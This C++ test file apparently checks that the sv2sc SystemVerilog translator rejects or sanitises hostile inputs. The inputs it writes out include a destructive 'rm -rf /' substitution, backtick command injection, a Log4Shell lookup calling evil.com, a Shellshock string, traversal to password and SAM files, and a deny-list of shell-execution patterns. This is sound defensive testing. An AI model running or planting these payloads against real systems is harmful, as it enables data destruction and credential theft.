#include <catch2/catch_test_macros.hpp>
#include <catch2/catch_session.hpp>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <regex>
#include <memory>

// Project includes
#include "sv2sc/sv2sc.h"
#include "../utils/test_data_manager.h"

/**
 * @brief Security Validation Test Suite
 * 
 * Comprehensive security testing for the sv2sc translator, covering:
 * - Input validation and sanitization
 * - Code injection prevention
 * - Path traversal attack prevention
 * - Buffer overflow protection
 * - Memory safety validation
 * - Privilege escalation prevention
 */
class SecurityTestSuite {
private:
    TestDataManager data_manager_;
    std::filesystem::path temp_dir_;
    
    struct SecurityTestResult {
        std::string attack_type;
        std::string payload;
        bool blocked;
        std::string generated_code;
        std::string error_message;
        bool safe_output;
    };
    
    struct VulnerabilityAssessment {
        std::string vulnerability_type;
        std::string severity; // "low", "medium", "high", "critical"
        std::string description;
        bool exploitable;
        std::vector<std::string> mitigation_suggestions;
    };

public:
    SecurityTestSuite() 
        : temp_dir_("/tmp/security_test_" + std::to_string(std::time(nullptr))) {
        std::filesystem::create_directories(temp_dir_);
    }
    
    ~SecurityTestSuite() {
        cleanup();
    }
    
    void cleanup() {
        if (std::filesystem::exists(temp_dir_)) {
            std::filesystem::remove_all(temp_dir_);
        }
    }
    
    SecurityTestResult testSecurityPayload(const std::string& payload, const std::string& attack_type) {
        SecurityTestResult result{};
        result.attack_type = attack_type;
        result.payload = payload;
        
        try {
            // Create temporary file with payload
            auto test_file = temp_dir_ / "security_test.sv";
            std::ofstream file(test_file);
            file << payload;
            file.close();
            
            // Attempt translation
            sv2sc::SV2SC translator;
            auto translation_result = translator.translateFile(test_file.string());
            
            result.blocked = !translation_result.success;
            result.generated_code = translation_result.header_code + translation_result.implementation_code;
            result.error_message = translation_result.error_message;
            
            // Check if output is safe
            result.safe_output = validateOutputSafety(result.generated_code, attack_type);
            
        } catch (const std::exception& e) {
            result.blocked = true;
            result.error_message = e.what();
            result.safe_output = true; // Exception means attack was blocked
        }
        
        return result;
    }
    
    std::vector<VulnerabilityAssessment> performVulnerabilityScanning() {
        std::vector<VulnerabilityAssessment> assessments;
        
        // Test various attack vectors
        std::vector<std::pair<std::string, std::string>> attack_vectors = {
            {"code_injection", "/* $(rm -rf /) */ module test; endmodule"},
            {"path_traversal", "../../../etc/passwd"},
            {"buffer_overflow", std::string(100000, 'A')},
            {"xss_attempt", "<script>alert('xss')</script>"},
            {"sql_injection", "'; DROP TABLE modules; --"},
            {"command_injection", "test`whoami`"},
            {"format_string", "%s%s%s%s%s%n"},
            {"null_byte", "test\x00hidden"},
        };
        
        for (const auto& [attack_type, payload] : attack_vectors) {
            auto test_result = testSecurityPayload(payload, attack_type);
            
            VulnerabilityAssessment assessment{};
            assessment.vulnerability_type = attack_type;
            
            if (!test_result.blocked && !test_result.safe_output) {
                assessment.severity = determineSeverity(attack_type);
                assessment.exploitable = true;
                assessment.description = "Potential vulnerability: " + attack_type + " not properly handled";
                assessment.mitigation_suggestions = getMitigationSuggestions(attack_type);
            } else {
                assessment.severity = "none";
                assessment.exploitable = false;
                assessment.description = "Attack vector properly handled";
            }
            
            assessments.push_back(assessment);
        }
        
        return assessments;
    }
    
    bool validateMemorySafety(const std::string& test_input) {
        // Test for potential memory safety issues
        try {
            for (int i = 0; i < 1000; ++i) {
                auto result = testSecurityPayload(test_input, "memory_safety");
                // Each iteration should not increase memory significantly
            }
            return true;
        } catch (...) {
            return false;
        }
    }

private:
    bool validateOutputSafety(const std::string& generated_code, const std::string& attack_type) {
        if (generated_code.empty()) return true; // No output is safe
        
        // Check for dangerous patterns in generated code
        std::vector<std::regex> dangerous_patterns = {
            std::regex(R"(system\s*\()"), // system() calls
            std::regex(R"(exec\w*\s*\()"), // exec family functions
            std::regex(R"(popen\s*\()"), // popen calls
            std::regex(R"(\$\([^)]*\))"), // Shell command substitution
            std::regex(R"(`[^`]*`)"), // Backtick command execution
            std::regex(R"(eval\s*\()"), // eval functions
            std::regex(R"(\.\./)"), // Path traversal attempts
            std::regex(R"(<script[^>]*>)"), // Script injection
            std::regex(R"(javascript:)"), // JavaScript protocol
        };
        
        for (const auto& pattern : dangerous_patterns) {
            if (std::regex_search(generated_code, pattern)) {
                return false;
            }
        }
        
        // Check for specific attack type patterns
        if (attack_type == "code_injection") {
            return generated_code.find("rm -rf") == std::string::npos &&
                   generated_code.find("$(") == std::string::npos;
        }
        
        if (attack_type == "xss_attempt") {
            return generated_code.find("<script>") == std::string::npos &&
                   generated_code.find("javascript:") == std::string::npos;
        }
        
        if (attack_type == "sql_injection") {
            return generated_code.find("DROP TABLE") == std::string::npos &&
                   generated_code.find("--") == std::string::npos;
        }
        
        return true;
    }
    
    std::string determineSeverity(const std::string& attack_type) {
        if (attack_type == "code_injection" || attack_type == "command_injection") {
            return "critical";
        }
        if (attack_type == "path_traversal" || attack_type == "buffer_overflow") {
            return "high";
        }
        if (attack_type == "xss_attempt" || attack_type == "sql_injection") {
            return "medium";
        }
        return "low";
    }
    
    std::vector<std::string> getMitigationSuggestions(const std::string& attack_type) {
        std::vector<std::string> suggestions;
        
        if (attack_type == "code_injection") {
            suggestions.push_back("Implement strict input validation for comments");
            suggestions.push_back("Sanitize all user-provided content");
            suggestions.push_back("Use allowlisting instead of blocklisting");
        } else if (attack_type == "path_traversal") {
            suggestions.push_back("Validate and canonicalize file paths");
            suggestions.push_back("Restrict file access to designated directories");
            suggestions.push_back("Use absolute paths internally");
        } else if (attack_type == "buffer_overflow") {
            suggestions.push_back("Implement length checks for all inputs");
            suggestions.push_back("Use safe string handling functions");
            suggestions.push_back("Add bounds checking for arrays");
        } else if (attack_type == "xss_attempt") {
            suggestions.push_back("HTML encode all output");
            suggestions.push_back("Validate input against expected patterns");
            suggestions.push_back("Use Content Security Policy headers");
        }
        
        return suggestions;
    }
};

TEST_CASE("Security Validation - Input Sanitization", "[security][input]") {
    SecurityTestSuite suite;
    
    SECTION("Code injection via comments") {
        std::string malicious_comment = R"(
            /* This is a comment $(rm -rf /) */
            module test_module(input logic clk);
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(malicious_comment, "code_injection");
        
        // Should either block the attack or sanitize the output
        REQUIRE((result.blocked || result.safe_output));
        
        if (!result.blocked) {
            // If translation succeeded, verify no shell commands in output
            REQUIRE(result.generated_code.find("rm -rf") == std::string::npos);
            REQUIRE(result.generated_code.find("$(") == std::string::npos);
        }
    }
    
    SECTION("Command injection via backticks") {
        std::string backtick_injection = R"(
            module test`whoami`;
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(backtick_injection, "command_injection");
        
        // Should be blocked or sanitized
        REQUIRE((result.blocked || result.safe_output));
        
        if (!result.blocked) {
            REQUIRE(result.generated_code.find("`whoami`") == std::string::npos);
        }
    }
    
    SECTION("XSS attempt in module names") {
        std::string xss_attempt = R"(
            module <script>alert('xss')</script>(
                input logic clk
            );
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(xss_attempt, "xss_attempt");
        
        // Should be blocked or sanitized
        REQUIRE((result.blocked || result.safe_output));
        
        if (!result.blocked) {
            REQUIRE(result.generated_code.find("<script>") == std::string::npos);
        }
    }
    
    SECTION("SQL injection patterns") {
        std::string sql_injection = R"(
            module test'; DROP TABLE modules; --(
                input logic clk
            );
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(sql_injection, "sql_injection");
        
        // Should be blocked or sanitized
        REQUIRE((result.blocked || result.safe_output));
        
        if (!result.blocked) {
            REQUIRE(result.generated_code.find("DROP TABLE") == std::string::npos);
        }
    }
}

TEST_CASE("Security Validation - Path Traversal", "[security][path]") {
    SecurityTestSuite suite;
    
    SECTION("Directory traversal attempts") {
        std::vector<std::string> traversal_attempts = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd"
        };
        
        for (const auto& attempt : traversal_attempts) {
            try {
                sv2sc::SV2SC translator;
                auto result = translator.translateFile(attempt);
                
                // Should fail with security error
                REQUIRE_FALSE(result.success);
                REQUIRE(result.error_message.find("security") != std::string::npos ||
                        result.error_message.find("invalid") != std::string::npos ||
                        result.error_message.find("not found") != std::string::npos);
                        
            } catch (const std::exception& e) {
                // Exception is acceptable for security violations
                std::string error_msg = e.what();
                REQUIRE((error_msg.find("security") != std::string::npos ||
                         error_msg.find("invalid") != std::string::npos ||
                         error_msg.find("access denied") != std::string::npos));
            }
        }
    }
    
    SECTION("Symlink traversal prevention") {
        // Create a symlink pointing outside allowed directory
        auto safe_file = suite.data_manager_.createTempFile("module safe; endmodule");
        auto dangerous_link = std::filesystem::path(safe_file).parent_path() / "dangerous_link.sv";
        
        // Try to create symlink to /etc/passwd
        if (std::filesystem::exists("/etc/passwd")) {
            try {
                std::filesystem::create_symlink("/etc/passwd", dangerous_link);
                
                sv2sc::SV2SC translator;
                auto result = translator.translateFile(dangerous_link.string());
                
                // Should not succeed in reading system files
                REQUIRE_FALSE(result.success);
                
                // Clean up
                std::filesystem::remove(dangerous_link);
                
            } catch (const std::filesystem::filesystem_error&) {
                // May fail due to permissions - that's fine for this test
                SUCCEED();
            }
        }
    }
}

TEST_CASE("Security Validation - Buffer Overflow Protection", "[security][buffer]") {
    SecurityTestSuite suite;
    
    SECTION("Extremely long identifiers") {
        std::string huge_identifier(100000, 'x');
        std::string huge_module = "module " + huge_identifier + "; endmodule";
        
        auto result = suite.testSecurityPayload(huge_module, "buffer_overflow");
        
        // Should handle gracefully without crashing
        // Either block with appropriate error or handle safely
        if (!result.blocked) {
            REQUIRE(result.safe_output);
            // Should not include the full huge identifier in output
            REQUIRE(result.generated_code.length() < huge_module.length());
        } else {
            REQUIRE(!result.error_message.empty());
        }
    }
    
    SECTION("Deeply nested structures") {
        std::string deep_nesting = "module test(";
        for (int i = 0; i < 10000; ++i) {
            deep_nesting += "input logic sig" + std::to_string(i) + ",";
        }
        deep_nesting += "input logic clk); endmodule";
        
        auto result = suite.testSecurityPayload(deep_nesting, "buffer_overflow");
        
        // Should handle gracefully
        REQUIRE((result.blocked || result.safe_output));
        
        if (result.blocked) {
            // Error message should indicate resource limits
            REQUIRE((result.error_message.find("too many") != std::string::npos ||
                     result.error_message.find("limit") != std::string::npos ||
                     result.error_message.find("resource") != std::string::npos));
        }
    }
    
    SECTION("Memory exhaustion attempts") {
        // Test with very large arrays
        std::string huge_array = R"(
            module memory_bomb(
                input logic clk
            );
                logic [1023:0] huge_signal [0:65535][0:65535];
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(huge_array, "memory_exhaustion");
        
        // Should handle without consuming excessive memory
        REQUIRE((result.blocked || result.safe_output));
    }
}

TEST_CASE("Security Validation - Memory Safety", "[security][memory]") {
    SecurityTestSuite suite;
    
    SECTION("Memory leak detection") {
        std::string test_module = R"(
            module leak_test(
                input logic clk,
                input logic [7:0] data
            );
                always_ff @(posedge clk) begin
                    // Simple module for memory testing
                end
            endmodule
        )";
        
        bool memory_safe = suite.validateMemorySafety(test_module);
        REQUIRE(memory_safe);
    }
    
    SECTION("Use-after-free prevention") {
        // Test scenario where translator might access freed memory
        std::string complex_module = R"(
            module complex_test(
                input logic clk,
                input logic [31:0] data_in,
                output logic [31:0] data_out
            );
                logic [31:0] temp1, temp2, temp3;
                
                always_ff @(posedge clk) begin
                    temp1 <= data_in;
                    temp2 <= temp1;
                    temp3 <= temp2;
                    data_out <= temp3;
                end
            endmodule
        )";
        
        // Run multiple translations to test for memory errors
        for (int i = 0; i < 100; ++i) {
            auto result = suite.testSecurityPayload(complex_module, "use_after_free");
            // Should not crash or produce corrupted output
            if (!result.blocked) {
                REQUIRE(result.safe_output);
                REQUIRE(!result.generated_code.empty());
            }
        }
        
        SUCCEED();
    }
    
    SECTION("Integer overflow protection") {
        std::string overflow_test = R"(
            module overflow_test(
                input logic [2147483647:0] max_width_signal
            );
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(overflow_test, "integer_overflow");
        
        // Should handle extreme values gracefully
        REQUIRE((result.blocked || result.safe_output));
        
        if (result.blocked) {
            REQUIRE(result.error_message.find("width") != std::string::npos ||
                    result.error_message.find("range") != std::string::npos ||
                    result.error_message.find("limit") != std::string::npos);
        }
    }
}

TEST_CASE("Security Validation - Comprehensive Assessment", "[security][assessment]") {
    SecurityTestSuite suite;
    
    SECTION("Full vulnerability scan") {
        auto vulnerabilities = suite.performVulnerabilityScanning();
        
        // Collect critical and high severity vulnerabilities
        std::vector<SecurityTestSuite::VulnerabilityAssessment> serious_vulns;
        
        for (const auto& vuln : vulnerabilities) {
            if (vuln.severity == "critical" || vuln.severity == "high") {
                serious_vulns.push_back(vuln);
            }
        }
        
        // Should have no critical vulnerabilities
        int critical_count = 0;
        int high_count = 0;
        
        for (const auto& vuln : serious_vulns) {
            if (vuln.severity == "critical" && vuln.exploitable) {
                critical_count++;
            } else if (vuln.severity == "high" && vuln.exploitable) {
                high_count++;
            }
        }
        
        INFO("Critical vulnerabilities found: " << critical_count);
        INFO("High severity vulnerabilities found: " << high_count);
        
        // Security requirement: No critical vulnerabilities
        REQUIRE(critical_count == 0);
        
        // Acceptable: Up to 2 high severity vulnerabilities if properly documented
        REQUIRE(high_count <= 2);
        
        // All vulnerabilities should have mitigation suggestions
        for (const auto& vuln : serious_vulns) {
            if (vuln.exploitable) {
                REQUIRE(!vuln.mitigation_suggestions.empty());
            }
        }
    }
    
    SECTION("Security regression testing") {
        // Test known attack patterns that should be blocked
        std::vector<std::pair<std::string, std::string>> known_attacks = {
            {"Shellshock", "() { :;}; echo vulnerable"},
            {"Log4Shell", "${jndi:ldap://evil.com/a}"},
            {"Path traversal", "../../../etc/passwd"},
            {"Null byte injection", "safe_file.txt\x00malicious_file.exe"},
            {"Format string", "%x%x%x%x%x%n"},
        };
        
        for (const auto& [attack_name, payload] : known_attacks) {
            INFO("Testing protection against: " << attack_name);
            
            auto result = suite.testSecurityPayload(payload, attack_name);
            
            // Known attacks should be blocked or safely handled
            REQUIRE((result.blocked || result.safe_output));
            
            if (!result.blocked && !result.safe_output) {
                FAIL("Known attack not properly handled: " << attack_name);
            }
        }
    }
    
    SECTION("Privilege escalation prevention") {
        // Test that translator doesn't perform privileged operations
        std::string privilege_test = R"(
            module privilege_test;
                // Test that translator doesn't try to access privileged files
                // or execute privileged commands during translation
            endmodule
        )";
        
        auto result = suite.testSecurityPayload(privilege_test, "privilege_escalation");
        
        // Should complete without requiring elevated privileges
        // If blocked, should be due to syntax errors, not privilege issues
        if (result.blocked) {
            REQUIRE(result.error_message.find("permission") == std::string::npos);
            REQUIRE(result.error_message.find("privilege") == std::string::npos);
            REQUIRE(result.error_message.find("access denied") == std::string::npos);
        }
    }
}